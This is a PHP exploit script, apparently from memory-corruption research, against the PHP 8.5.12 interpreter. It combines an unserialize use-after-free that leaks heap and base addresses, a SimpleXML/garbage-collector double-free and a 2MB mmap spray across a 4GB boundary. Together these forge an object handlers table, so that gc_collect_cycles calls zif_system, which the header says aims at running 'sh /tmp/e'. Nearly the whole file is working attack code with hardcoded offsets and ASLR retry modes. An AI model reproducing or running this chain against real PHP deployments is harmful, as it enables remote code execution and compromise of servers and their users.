<?php
// shape12_nfcompose.php — ZERO2 GC N-FORMULA + HEAP-LEAK COMPOSITION:
// upgrade of the GH-24488/GC-shape (double-freed sxe props HashTable B,
// zend_gc.c:2138/2142) from deterministic DoS to a controlled call, by
// composing it with the zero4 in-band leak machinery.
//
// MECHANISM (all receipted by the rg lane + this lane):
//  - The double-free leaves the 56B props HashTable B on the bin-6 freelist
//    when the GC destroy-zvals walk reaches B's garbage entry.
//  - GC_TYPE(p) = *(uint32*)(B+4) & 0xf = bits 32..35 of the freelist NEXT
//    pointer = low nibble of the heap chunk high dword H. Nibble 8 =>
//    IS_OBJECT branch.
//  - obj->handlers = *(B+0x18) = {nNumUsed, nNumOfElements} = N (XML child
//    count) => handlers = (N<<32)|N. The rg lane proved this address can
//    never be a NORMAL mapping ("high dword < low dword" argument) — BUT a
//    4GB-boundary-crossing mmap spray puts a string mapping at exactly
//    [H<<32, H<<32 + 2MB): low dword of the mapping start = 0. With N = H,
//    handlers = (H<<32)|H = boundary + H lands INSIDE that sprayed string.
//    => the :2138 offset read and the :2142 free_obj read both read OUR
//    bytes.
//  - The :2142 call is gated by IS_OBJ_FREE_CALLED (bit 9 of B+4). B+4 =
//    high dword of the freelist next = H itself, so the gate is OPEN iff
//    bit 9 of H is clear — a per-run ASLR coin (1/2 of nibble-8 runs).
//  - Plant offset = B - T => the call target zif_system(rdi = T) with T a
//    fake execute_data inside the sprayed string => system("sh /tmp/e").
//
// MODES (argv[1]):
//  probe   — leak + maps survey + gate check only (no spray, fast re-roll)
//  gdb     — full chain, free_obj = PC marker 0x4242424242424242, offset =
//            0x11111111 (receipts: :2138 reads OUR values; :2142 controlled
//            PC; gate-closed runs receipt the :2170 efree steer)
//  call    — full chain, free_obj = zif_system: on a gate-open run the GC
//            walk calls zif_system(B) => in-band warning receipt, no
//            debugger. Retry envelope: fresh process per attempt (ASLR
//            re-rolls H; gate-open = P 1/32).
// usage: php -n shape12_nfcompose.php [mode]
// Per-build offsets: plain2 8.5.12 zend_empty_array=0xffe460 zif_system=0x523c60

$MODE = (string)($argv[1] ?? 'probe');
$OFF_EMPTY = 0xffe460;   // plain2 8.5.12
$OFF_ZIF   = 0x523c60;   // plain2 8.5.12
ini_set('memory_limit', '-1');

class D { public static string $dp = ''; }
class E { public static int $block2 = 0; public static int $base = 0; }

class Stage1 {
    public function __destruct() {
        $arr = unserialize(D::$dp);
        $blk = $arr[129];
        if ($blk === 5 || !is_int($blk) || $blk < 0x10000) { return; }
        E::$block2 = $blk - 5056;
        // M2 base oracle (same as zero4)
        unserialize('a:0:{}'); unserialize('a:0:{}'); unserialize('a:0:{}');
        $u5 = unserialize('a:0:{}');
        $vm5 = 0; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 1) { $vm5 = (int)$v; } }
        if ($vm5 < 0x10000) { return; }
        unserialize('a:0:{}'); unserialize('a:0:{}'); unserialize('a:0:{}');
        $u9 = unserialize('a:0:{}');
        $vs = ''; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 2) { $vs = $v; } }
        unserialize('a:0:{}');
        $len_s = strlen($vs);
        unserialize('a:0:{}'); unserialize('a:0:{}'); unserialize('a:0:{}');
        $vm13 = 0; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 3) { $vm13 = (int)$v; } }
        unserialize('a:0:{}'); unserialize('a:0:{}'); unserialize('a:0:{}'); unserialize('a:0:{}');
        $vs2 = ''; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 4) { $vs2 = $v; } }
        unserialize('a:0:{}');
        $len_s2 = strlen($vs2);
        if ($vm13 - $vm5 !== 128) { return; }
        if ($len_s !== $len_s2) { return; }
        if (($len_s & 0xfff) !== (E_OFF_EMPTY() & 0xfff)) { return; }
        $base = $len_s - E_OFF_EMPTY();
        if (($base & 0xfff) !== 0) { return; }
        E::$base = $base;
        unset($arr);   // dtor slot[1] holds rc=1; walk frees block2 later
    }
}
function E_OFF_EMPTY(): int { return 0xffe460; }

// ---- Phase A: the zero4 dance leak (M1 + M2) via the var_destroy UAF ----
$d  = 'i:129;i:5;';
$d .= 'i:1028;i:1;';
$d .= 'i:8;s:8:"AAAAAAAA";';
$d .= 'i:10;i:1;';
$d .= 'i:12;s:8:"BBBBBBBB";';
for ($m = 5; $m <= 61; $m++) { $d .= 'i:' . (2*$m+4) . ';i:1;'; }
for ($j = 2; $j <= 65; $j++) { $d .= 'i:' . (256*$j) . ';R:1;'; }
$d .= 'i:16896;i:1;';
D::$dp = 'a:127:{' . $d . '}';

$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:6:"Stage1":0:{}';   // leak stage via the standard O: entry
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';
$r = @unserialize($payload);
if (!E::$block2 || !E::$base) {
    echo "PHASE-A-FAIL leak block2=0x", dechex(E::$block2), " base=0x", dechex(E::$base), "\n";
    exit(2);
}
echo "PHASE-A leak: block2=0x", dechex(E::$block2), " base=0x", dechex(E::$base), "\n";

// ---- maps helpers ----
function za_regions(): array {
    $out = [];
    $lines = explode("\n", file_get_contents('/proc/self/maps'));
    foreach ($lines as $ln) {
        if ($ln === '' || strpos($ln, 'zend_alloc') === false) continue;
        $sp = strpos($ln, '-');
        $sp2 = strpos($ln, ' ');
        $s = hexdec(substr($ln, 0, $sp));
        $e = hexdec(substr($ln, $sp + 1, $sp2 - $sp - 1));
        $out[] = [$s, $e];
    }
    return $out;
}

$za = za_regions();
$floor = PHP_INT_MAX;
foreach ($za as [$s, $e]) { if ($s < $floor) $floor = $s; }
$H = (int)($floor >> 32);
$low = (int)($floor & 0xFFFFFFFF);
$B4 = ((int)$H) << 32;
$dist = $low;
echo "HEAP floor=0x", dechex($floor), " H=0x", dechex($H),
     " nibble=", ($H & 0xf), " bit9=", (($H >> 9) & 1),
     " boundary=0x", dechex($B4), " dist=", (int)($dist/1048576), "MB\n";

if ($MODE === 'probe') {
    echo (($H & 0xf) === 8 && (($H >> 9) & 1) === 0) ? "GATE-OPEN\n" : "GATE-CLOSED\n";
    exit(0);
}
if (($H & 0xf) !== 8) { echo "REJECT nibble\n"; exit(3); }
if (MODE_GATE($H)) { echo "GATE-OPEN (call will fire)\n"; }
else { echo "GATE-CLOSED bit9 (read+efree still fire — gdb mode OK)\n"; if ($MODE === 'call') exit(3); }
function MODE_GATE(int $H): bool { return (($H >> 9) & 1) === 0; }

// ---- Phase B: arm the GC shape with N = H distinct children ----
// B (56B props HashTable) is allocated HERE, pre-spray, in an H-window chunk.
$N = $H;
$parts = [];
for ($i = 0; $i < $N; $i++) { $parts[] = "<c$i>v$i</c$i>"; }
$xml = new SimpleXMLElement('<root>' . implode('', $parts) . '</root>');
$x = (array)$xml;
$w = new stdClass();
$w->self = $w;
$w->x = $xml;
echo "ARM done N=$N children\n";

// ---- Phase C: 4GB-boundary spray ----
// Each string = exactly one 2MB mmap ([anon:zend_alloc]); the walk crosses
// the 4GB boundary at B4 = H<<32. Pattern (16B, phase: handlers-24 mod 16
// == 0 since handlers = B4+H, H%16==8, val starts at base+24, base%16==0):
//   [0..4)  = offset (int32)  — planted
//   [4..8)  = pad
//   [8..16) = free_obj (zif_system or PC marker) — planted
$STRLEN = 0x200000 - 0x1000;   // +24B header => exactly 0x200000 mmap
$OFF_PLANT = 0x11111111;                       // :2138 read + :2170 efree steer
$FREE_PLANT = ($MODE === 'gdb')
    ? 0x4242424242424242                       // gdb receipt: controlled PC
    : (E::$base + $OFF_ZIF);                   // call mode: GC calls zif_system(B)
$pat = pack('l', $OFF_PLANT) . pack('l', 0) . pack('P', $FREE_PLANT);
$one = str_repeat($pat, (int)($STRLEN / 16));
$one = substr($one, 0, $STRLEN);

$K = (int)(($dist + 0x1FFFFF) / 0x200000) + 4;
// memory budget guard (WSL headroom)
$avail = 6 * 1024 * 1024 * 1024;
foreach (explode("\n", file_get_contents('/proc/meminfo')) as $ml) {
    if (strpos($ml, 'MemAvailable:') === 0) { $avail = (int)trim(substr($ml, 13)) * 1024; }
}
if ($K * 0x200000 + 600 * 1048576 > $avail) {
    echo "REJECT budget K=$K avail=", (int)($avail/1048576), "MB\n"; exit(6);
}
echo "SPRAY K=$K strings of 2MB (~", (int)($K*2/1024), "MB)\n";
$holder = new SplFixedArray($K);
for ($i = 0; $i < $K; $i++) { $holder[$i] = str_repeat($one, 1); }

// ---- verify the boundary is covered ----
$za2 = za_regions();
$bstr = null;
foreach ($za2 as [$s, $e]) {
    if ($s <= $B4 && $B4 < $e) { $bstr = [$s, $e]; break; }
}
if ($bstr === null) { echo "REJECT boundary uncovered\n"; exit(4); }
echo "BOUNDARY string [0x", dechex($bstr[0]), ",0x", dechex($bstr[1]), ") sz=0x", dechex($bstr[1]-$bstr[0]),
     " covers B4=0x", dechex($B4),
     " handlers=0x", dechex($B4 + $H), " inside=", (int)($bstr[0] <= $B4 + $H && $B4 + $H < $bstr[1]), "\n";
// region-size histogram of the sprayed block (tuning receipt)
$sizes = [];
foreach ($za2 as [$s, $e]) { $z = dechex($e-$s); $sizes[$z] = ($sizes[$z] ?? 0) + 1; }
arsort($sizes);
$i2 = 0; foreach ($sizes as $z => $c) { echo "region-size 0x$z x$c\n"; if (++$i2 >= 4) break; }

// ---- FIRE ----
// call mode, gate-open run: the GC walk itself executes
//   obj->handlers->free_obj(obj)  with  handlers = B4+H (spray)
//   free_obj = *(B4+H+8) = zif_system, obj = B (the freed props table).
// zif_system(B) parses B as execute_data: num_args = *(int*)(B+44) = high
// half of nNextFreeElement = 0 => it emits
//   "PHP Warning: system() expects at least 1 parameter, 0 given"
// FROM INSIDE gc_collect_cycles — the in-band (no debugger) receipt that
// the controlled call fired. The rdi=B argument layout is the one open
// item for full command exec (see SHAPE12_STATUS.md).
echo "FIRE gc_collect_cycles\n";
flush();
unset($xml, $x, $w);
gc_collect_cycles();
echo "SURVIVED-GC\n";
echo "SCRIPT-END\n";
